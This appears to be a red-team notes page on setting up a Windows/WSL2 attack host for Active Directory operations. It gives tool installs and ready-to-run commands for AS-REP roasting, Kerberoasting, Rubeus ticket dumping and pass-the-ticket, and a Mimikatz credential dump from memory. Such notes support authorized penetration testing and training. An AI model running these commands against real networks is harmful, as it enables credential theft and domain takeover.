# Windows Attack Host

Setup and use a Windows-based attack host (native or WSL2) for Active Directory offensive operations. Includes recommended tooling, install notes, and key command examples.

---

## Tools

- Native: PowerShell 7+, Rubeus.exe, SharpHound.exe, BloodHound GUI, Sysinternals, PuTTY/Plink, Chisel
- WSL2: Python3, impacket, crackmapexec, ldapdomaindump, hashcat (if GPU passthrough), neo4j

---

## Example setup (PowerShell + WSL2)

```powershell
# On Windows: install Chocolatey and a few helpers (optional)
choco install -y putty sysinternals

# On WSL2 (Ubuntu):
sudo apt update && sudo apt install -y python3-pip git neo4j
python3 -m pip install --user impacket ldapdomaindump bloodhound crackmapexec
```

Add `~/.local/bin` to your PATH on WSL.

---

## Core workflows & commands

### Kerberos artifacts (Impacket via WSL)

```bash
# AS-REP collection (WSL)
GetNPUsers.py DOMAIN/ -no-pass -dc-ip DC_IP -usersfile users.txt -outputfile asrep_hashes.txt

# Kerberoast collection (needs creds)
GetUserSPNs.py DOMAIN/attackeruser:Password@DC_IP -outputfile kerberoast.hashes
```

### BloodHound analysis

- Run Neo4j (WSL or native), start BloodHound GUI, import SharpHound zip(s).

### Rubeus (Windows)

```powershell
# List tickets
.\Rubeus.exe list
# Inject ticket
.\Rubeus.exe ptt /ticket:admin.kirbi
# Extract tickets to file
.\Rubeus.exe dump
```

### Mimikatz

- `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"`

Notes:

- Keep Impacket, BloodHound, and Rubeus updated.

---
